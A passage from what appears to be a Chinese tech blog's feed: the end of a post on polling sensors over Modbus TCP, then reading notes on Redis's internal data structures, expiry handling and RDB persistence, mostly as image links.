00204、00205 传感器</p><p>   传感器的 Modbus 地址 = (2-1)*N + (1-1)*2  其中 N=100 或者 48</p><p>   即100，十六进制的0x0064</p><p>   上位机发送：00 00 00 00 00 06 01 03 00 64 00 0A  </p><p>   设备回送： 00 00 00 00 00 17 01 03 14 连续 20 字节数据</p><p>   设备地址1，从传感器 00101 开始，读六个传感器的值，即00101、00102、00103、00104、00105、00106传感器</p><p>   传感器的 Modbus 地址 = (1-1)*100+(1-1)*2 其中N = 100 </p><p>   即0x0000</p><p>   上位机发送：00 00 00 00 00 06 01 03 00 00 00 0C</p><p>   设备回送：00 00 00 00 00 1B 01 03 18 连续24字节数据</p><p>​        </p><ol start="7"><li><p>Modbus TCP Server 默认端口为 502，默认设备地址为 1。 由于 ModBus 协议的限制，每次最多能读连续 63 个传感器的数据，而设备的每个通 道最大传感器数有 50 个，对于多通道设备需要分多次，才能把所有传感器的数据读完。 </p><p>简单的方法是，每次读取一个通道中从 1 开始的连续个传感器。比如 4 通道设备，每通道有 10 个传感器，则连续读 4 次： 读 00101 开始的 10 个传感器； 读 00201 开始的 10 个传感器； 读 00301 开始的 10 个传感器； 读 00401 开始的 10 个传感器；</p></li></ol><h2 id="用Modbus-Poll-进行测试"><a href="#用Modbus-Poll-进行测试" class="headerlink" title="用Modbus Poll 进行测试"></a>用Modbus Poll 进行测试</h2><p>注册码</p><p>显然每个传感器的值就是下面两个两个组成的十六进制值，转成十进制就等于物理值*10000</p><p>所以就可以将每次轮询得到的24字节解析成6个物理值</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211212124012.png" alt="image-20211212124003614"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211212124832.png" alt="image-20211212124829581"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ModbusTCP协议简介&quot;&gt;&lt;a href=&quot;#ModbusTCP协议简介&quot; class=&quot;headerlink&quot; title=&quot;ModbusTCP协议简介&quot;&gt;&lt;/a&gt;ModbusTCP协议简介&lt;/h1&gt;&lt;p&gt;Modbus由MODICON公司于1979年开发，是
      
    
    </summary>
    
    
      <category term="计算机网络" scheme="https://blog.kaluna.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="ModbusTCP" scheme="https://blog.kaluna.top/tags/ModbusTCP/"/>
    
  </entry>
  
  <entry>
    <title>Redis设计与实现之读书笔记</title>
    <link href="https://blog.kaluna.top/2021/12/09/Redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E4%B9%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.kaluna.top/2021/12/09/Redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E4%B9%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2021-12-09T00:57:09.049Z</published>
    <updated>2021-12-10T12:10:46.872Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一部分-数据结构与对象"><a href="#第一部分-数据结构与对象" class="headerlink" title="第一部分 数据结构与对象"></a>第一部分 数据结构与对象</h1><h2 id="第二章-简单动态字符串"><a href="#第二章-简单动态字符串" class="headerlink" title="第二章 简单动态字符串"></a>第二章 简单动态字符串</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208133235.png" alt="image-20211208133233464"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208133246.png" alt="image-20211208133243593"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208133345.png" alt="image-20211208133343784"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208133323.png" alt="image-20211208133322367"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208133427.png" alt="image-20211208133426544"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208133450.png" alt="image-20211208133448741"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208133503.png" alt="image-20211208133501416"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208133529.png" alt="image-20211208133527862"></p><p>Redis 只会使用 C 字符串作为字面量，在大多数情况下，Redis 使用 SDS（Simple Dynamic String，简单动态字符串）作为字符串表示。 </p><p><strong>比起 C 字符串，SDS 具有以下优点：</strong> </p><p>1）常数复杂度获取字符串长度。 2）杜绝缓冲区溢出。 3）减少修改字符串长度时所需的内存重分配次数。 4）二进制安全。 5）兼容部分 C 字符串函数。</p><h2 id="第三章-链表"><a href="#第三章-链表" class="headerlink" title="第三章 链表"></a>第三章 链表</h2><p>列表键的底层实现之一，当一个列表键包含了数量比较多的元素，又或者列表中包含的元素都是比较长的字符串时，Redis就会使用链表来作为列表键的底层实现。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208133716.png" alt="image-20211208133715387"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208133737.png" alt="image-20211208133736524"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208133805.png" alt="image-20211208133803987"></p><p>链表被广泛用于实现 Redis 的各种功能，比如列表键、发布与订阅、慢查询、监视 器等。 每个链表节点由一个 listNode 结构来表示，每个节点都有一个指向前置节点和后 置节点的指针，所以 Redis 的链表实现是双端链表。每个链表使用一个 list 结构来表示，这个结构带有表头节点指针、表尾节点指针， 以及链表长度等信息。因为链表表头节点的前置节点和表尾节点的后置节点都指向 NULL，所以 Redis 的链 表实现是无环链表。通过为链表设置不同的类型特定函数，Redis 的链表可以用于保存各种不同类型的值。</p><h2 id="第四章-字典"><a href="#第四章-字典" class="headerlink" title="第四章 字典"></a>第四章 字典</h2><p>除了用来表示数据库之外，字典还是哈希键的底层实现之一，当一个哈希键包含的键值对比较多，又或者键值对中的元素都是比较长的字符串时，redis就会使用字典作为哈希键的底层实现。redis的字典使用哈希表作为底层实现，一个哈希表里面有多个哈希表节点，每个哈希表节点就保存了字典中的一个键值对。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208150915.png" alt="image-20211208150914165"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208151056.png" alt="image-20211208151054413"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208150940.png" alt="image-20211208150939376"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208151002.png" alt="image-20211208151001052"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208151154.png" alt="image-20211208151153461"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208151245.png" alt="image-20211208151244494"></p><p><strong>ht[1] 哈希表只会对ht[0] 哈希表进行rehash 时使用</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208153925.png" alt="image-20211208153924631"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208154920.png" alt="image-20211208154917059"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208155038.png" alt="image-20211208155037644"></p><p><strong>Redis用MurmurHash算法来计算键的哈希值，该算法可以给出一个很好的随机性。</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208155600.png" alt="image-20211208155558784"></p><p><strong>程序总是将新节点添加到链表的表头位置</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208160113.png" alt="image-20211208160110880"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208160238.png" alt="image-20211208160237418"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208160409.png" alt="image-20211208160408665"></p><p><strong>//TODO 等我看完操作系统回头来看看这是什么意思</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208213838.png" alt="image-20211208213829644"></p><p>渐进式rehash</p><p><img src="C:/Users/86158/AppData/Roaming/Typora/typora-user-images/image-20211208214541860.png" alt="image-20211208214541860"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208214557.png" alt="image-20211208214556018"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208214609.png" alt="image-20211208214608613"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208214624.png" alt="image-20211208214623220"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208214651.png" alt="image-20211208214650133"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208214709.png" alt="image-20211208214708196"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208214729.png" alt="image-20211208214728758"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208215643.png" alt="image-20211208215642393"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208215927.png" alt="image-20211208215925322"></p><h2 id="第五章-跳跃表"><a href="#第五章-跳跃表" class="headerlink" title="第五章 跳跃表"></a>第五章 跳跃表</h2><p>跳跃表支持平均O(logN)，最坏O(N) 复杂度查找，作为有序集合键的底层实现之一，redis只在两个地方用到了跳跃表，一个是实现有序集合键，另一个是在集群节点中用作内部数据结构。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208221808.png" alt="image-20211208221807338"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208223124.png" alt="image-20211208223123554"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209000617.png" alt="image-20211209000615498"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208223334.png" alt="image-20211208223332753"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208223511.png" alt="image-20211208223509756"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208224343.png" alt="image-20211208224341759"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208224413.png" alt="image-20211208224412303"></p><p>跨度实际上是用来计算排位rank的，将沿途访问过的所有层的跨度累计起来，得到的结果就是目标节点在跳跃表中的排位。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208224950.png" alt="image-20211208224949435"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208225010.png" alt="image-20211208225009825"></p><p><strong>后退指针每次只能后退至前一个节点。</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211208225502.png" alt="image-20211208225500811"></p><p>score 是一个double类型的浮点数</p><p>obj属性是一个指针，指向一个字符串对象，字符串对象保存着一个SDS值</p><p>同一个跳跃表，各个节点保存的成员对象必须是唯一的，多个节点保存的分值可以相同，分值相同的节点将按照成员对象在字典序中的大小来进行排序，成员对象较小的节点排在前面。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209154531.png" alt="image-20211208232636459"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209001152.png" alt="image-20211209001150712"></p><p><strong>每个跳跃表节点的层高都是1至32之间的随机数</strong></p><h2 id="第六章-整数集合"><a href="#第六章-整数集合" class="headerlink" title="第六章 整数集合"></a>第六章 整数集合</h2><p>intset是集合键的底层实现之一，当一个集合中只包含整数，并且元素数量不多时，Redis就会使用这个inset作为集合键的底层实现</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209003213.png" alt="image-20211209003212392"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209003229.png" alt="image-20211209003228029"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209003245.png" alt="image-20211209003243744"></p><p><strong>升级</strong></p><p>升级首先要做的就是根据新类型的长度，以及集合元素的数量（包括要添加的新元素在内），对底层数组进行空间重分配。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209084557.png" alt="image-20211209083346846"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209084553.png" alt="image-20211209083639526"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209084548.png" alt="image-20211209083935824"></p><p>新元素小于现有元素的情况下，新元素会被放置在底层数组的最开头（索引0）；</p><p>新元素大于现有元素的情况下，新元素会被放置在底层数组的最末尾（索引 length - 1）；</p><p><strong>每次向整数集合添加新元素都可能会引起升级，而每次升级都需要对底层数组中已经有的所有元素进行类型转换，所以新元素的时间复杂度为O(N)</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209085324.png" alt="image-20211209085323681"></p><h2 id="第七章-压缩列表"><a href="#第七章-压缩列表" class="headerlink" title="第七章 压缩列表"></a>第七章 压缩列表</h2><p>压缩列表ziplist是列表键和哈希键的底层实现之一。当一个列表键只包含少量列表项，并且每个列表项要么是小整数值，要么就是长度比较短的字符串，那么Redis就会使用压缩列表来做列表键的底层实现。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209091508.png" alt="image-20211209091507303"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209092105.png" alt="image-20211209092104548"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209092248.png" alt="image-20211209092247009"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209092517.png" alt="image-20211209092516820"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209092949.png" alt="image-20211209092943262"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209093118.png" alt="image-20211209093116855"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209093335.png" alt="image-20211209093333990"></p><p><strong>encoding</strong></p><p>一字节、两字节或者五字节长，值的最高位位00、01或者10的是字节数组编码，这种编码表示节点的content属性保存着字节数组，数组的长度由编码除去最高两位之后的其他位记录；</p><p>一字节长，值的最高位以11开头的是整数编码，这种编码表示节点的content属性保存着整数值，整数值的类型和长度由编码除去最高两位之后的其他位记录；</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209094055.png" alt="image-20211209094054538"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209095941.png" alt="image-20211209095939908"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209100155.png" alt="image-20211209100153485"></p><p><strong>连锁更新</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209102432.png" alt="image-20211209102431069"></p><p><strong>ziplistPush等命令的平均复杂度仅为O(N)</strong></p><p>因为ziplistPush ziplistInsert ziplistDelete ziplistDeleteRange 四个函数都有可能引发连锁更新，所以他们的最坏复杂度都是$O(N^2)$，但是这种操作出现的几率不高。</p><p>因为连锁更新在最坏情况下需要对压缩列表执行N次空间重分配操作，而每次空间重分配的最坏复杂度为O(N)，所以连锁更新的最坏复杂度为$O(N^2)$</p><h2 id="第八章-对象"><a href="#第八章-对象" class="headerlink" title="第八章 对象"></a>第八章 对象</h2><p>redis基于sds，双端链表，字典，压缩链表，整数集合来创建了一个对象系统，这个系统包含字符串对象，列表对象，哈希对象，集合对象，有序集合对象着五种类型的对象。</p><p>redis对象系统实现了基于引用计数技术的内存回收机制，另外，redis通过引用计数技术实现了对象共享机制，这个机制可以在适当的条件下，通过让多个数据库键共享同i对象来节约内存。</p><p>在服务器启用了maxmemory功能的情况下，数据库键的空转时长较大的优先被服务器删除，因为redis的对象带有访问时间记录信息。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209110110.png" alt="image-20211209110109010"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209110126.png" alt="image-20211209110125157"></p><p>键总是一个字符串对象，而值可以是字符串对象，列表对象，哈希对象，集合对象或者有序经济和对象的其中一种。</p><p>“字符串键”是指这个数据库对应的值为字符串对象，</p><p>“列表键”是指这个数据库所对应的值为列表对象。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209110905.png" alt="image-20211209110903574"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209111028.png" alt="image-20211209111027230"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209113436.png" alt="image-20211209113435457"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209114739.png" alt="image-20211209114737745"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209114747.png" alt="image-20211209114745926"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209120249.png" alt="image-20211209120248399"></p><p><strong>字符串值的长度大于32字节</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209120430.png" alt="image-20211209120428846"></p><p><strong>字符串值的长度小于32字节</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209132141.png" alt="image-20211209132140125"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209120646.png" alt="image-20211209120645571"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209141018.png" alt="image-20211209141016926"></p><p>long double 类型表示的浮点数在redis中也是作为字符串值来保存的。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209141600.png" alt="image-20211209141558833"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209142131.png" alt="image-20211209142129698"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209142317.png" alt="image-20211209142316091"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209143102.png" alt="image-20211209143100345"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209143025.png" alt="image-20211209143022959"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209143415.png" alt="image-20211209143413748"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209144150.png" alt="image-20211209144148618"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209144256.png" alt="image-20211209144254788"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209144555.png" alt="image-20211209144554248"></p><p><strong>哈希对象</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209145057.png" alt="image-20211209145056236"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209144943.png" alt="image-20211209144942565"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209145002.png" alt="image-20211209145001143"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209145206.png" alt="image-20211209145205256"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209145255.png" alt="image-20211209145254387"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209145613.png" alt="image-20211209145612080"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209145750.png" alt="image-20211209145748195"></p><p><strong>集合对象</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209150154.png" alt="image-20211209150153367"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209150705.png" alt="image-20211209150704379"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209150909.png" alt="image-20211209150908076"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209150927.png" alt="image-20211209150925898"></p><p><strong>有序集合对象</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209151413.png" alt="image-20211209151411365"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209151428.png" alt="image-20211209151426613"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209151501.png" alt="image-20211209151500004"></p><p><strong>skiplist编码的有序集合对象使用zset结构作为底层实现，一个zset结构包含一个字典和一个跳跃表。</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209151729.png" alt="image-20211209151727732"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209151750.png" alt="image-20211209151749487"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209152440.png" alt="image-20211209152438709"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209152545.png" alt="image-20211209152544089"></p><p><strong>有序集合每个元素的成员都是一个字符串对象，而每个元素的分值都是一个double类型的浮点数。虽然zset结构同时使用跳跃表和字典来保存有序集合元素，但这两种数据结构都会通过指针来共享相同元素的成员和分支，所以同时使用跳跃表和字典来保存集合元素不会产生任何重复成员或者分值。</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209153315.png" alt="image-20211209153311597"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209153442.png" alt="image-20211209153441259"></p><p><strong>有序集合键的值为哈希对象，所以用于有序集合键的所有命令都是针对哈希对象来构建的。</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209153855.png" alt="image-20211209153854025"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209234136.png" alt="image-20211209154232928"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209154248.png" alt="image-20211209154246812"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209154347.png" alt="image-20211209154345945"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209154744.png" alt="image-20211209154743800"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209155032.png" alt="image-20211209155031195"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209155205.png" alt="image-20211209155204185"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209155244.png" alt="image-20211209155242715"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209155401.png" alt="image-20211209155400261"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209155618.png" alt="image-20211209155617230"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209155751.png" alt="image-20211209155750060"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209155907.png" alt="image-20211209155906203"></p><p>在初始化服务器时，创建一万个字符串对象，这些对象包含了从0到9999的所有整数值，当服务器需要用到值为0到9999字符串对象时，服务器就会使用这些共享对象，而不是新创建对象。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209160455.png" alt="image-20211209160454356"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209161123.png" alt="image-20211209161122176"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209161222.png" alt="image-20211209161220808"></p><h1 id="第二部分-单机数据库的实现"><a href="#第二部分-单机数据库的实现" class="headerlink" title="第二部分 单机数据库的实现"></a>第二部分 单机数据库的实现</h1><h2 id="第九章-数据库"><a href="#第九章-数据库" class="headerlink" title="第九章 数据库"></a>第九章 数据库</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209162049.png" alt="image-20211209162048052"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209162130.png" alt="image-20211209162128506"></p><p>切换数据库</p><p>select + 数字</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209162610.png" alt="image-20211209162608558"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209162730.png" alt="image-20211209162728589"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209163219.png" alt="image-20211209163214101"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209163639.png" alt="image-20211209163637910"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209164525.png" alt="image-20211209164523434"></p><p>数据库的键空间是字典</p><p>用于清空整个数据库的FLUSHDB命令，就是通过删除键空间中的所有键值对来实现的，RANDOMKEY命令，就是通过在键空间中随机返回一个键来实现的。</p><p>DBSIZE命令返回键空间中包含的键值对的数量来实现的，类似的命令还有EXISTS，RENAME，KEYS等。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209170508.png" alt="image-20211209170507155"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209170522.png" alt="image-20211209170520740"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209171056.png" alt="image-20211209171054999"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209171137.png" alt="image-20211209171136522"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209171325.png" alt="image-20211209171323630"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209171624.png" alt="image-20211209171622768"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209171818.png" alt="image-20211209171816877"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209171912.png" alt="image-20211209171910515"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209172501.png" alt="image-20211209172436526"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209172457.png" alt="image-20211209172456450"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209174135.png" alt="image-20211209174134344"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209174149.png" alt="image-20211209174147868"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209174335.png" alt="image-20211209174334327"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210085717.png" alt="image-20211210085714874"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209174638.png" alt="image-20211209174636795"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209175313.png" alt="image-20211209175311768"></p><p><strong>redis实际上使用的是惰性删除和定期删除两种策略</strong></p><p>过期的惰性删除策略由db.c/expireIfNeeded函数实现</p><p><strong>过期的定期删除策略由redis.c/activeExpireCycle函数实现，每当Redis的服务器周期性操作redis.c/serverCron函数执行时，activeExpireCycle函数就会被调用，它在规定的时间内，分多次遍历服务器中的各个数据库，从数据库的expires字典中随机检查一部分键的过期时间，并删除其中的过期键。</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209181204.png" alt="image-20211209181203225"></p><p><strong>AOF，RDB和复制功能对过期键的处理</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210085845.png" alt="image-20211210085844277"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210090146.png" alt="image-20211210090144578"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210090215.png" alt="image-20211210090213831"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210090402.png" alt="image-20211210090359185"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210092129.png" alt="image-20211210092127992"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210092427.png" alt="image-20211210092425904"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210092541.png" alt="image-20211210092540618"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210092631.png" alt="image-20211210092630056"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210092746.png" alt="image-20211210092745146"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210093113.png" alt="image-20211210093112018"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210093502.png" alt="image-20211210093501019"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210093624.png" alt="image-20211210093623384"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210094119.png" alt="image-20211210094117596"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210102921.png" alt="image-20211210102919761"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210103117.png" alt="image-20211210103115140"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210102748.png" alt="image-20211210102745573"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210103349.png" alt="image-20211210103347567"></p><h2 id="第十章-RDB持久化"><a href="#第十章-RDB持久化" class="headerlink" title="第十章 RDB持久化"></a>第十章 RDB持久化</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209182531.png" alt="image-20211209182529181"></p><p>Redis是内存数据库，它将自己的数据库状态存储在内存里面。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209182651.png" alt="image-20211209182649916"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209183035.png" alt="image-20211209183033598"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209183053.png" alt="image-20211209183051906"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211209183331.png" alt="image-20211209183329734"></p><p><img 